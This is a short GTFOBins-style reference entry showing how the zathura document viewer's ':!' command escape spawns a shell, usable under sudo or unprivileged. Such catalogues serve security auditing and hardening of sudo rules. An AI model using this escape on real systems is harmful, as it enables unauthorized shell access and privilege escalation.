---
type: gtfobin
name: zathura
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# zathura

## shell

```bash
zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
```
_The interaction happens in a GUI window, while the shell is dropped in the terminal._
**Contexts:** sudo, unprivileged
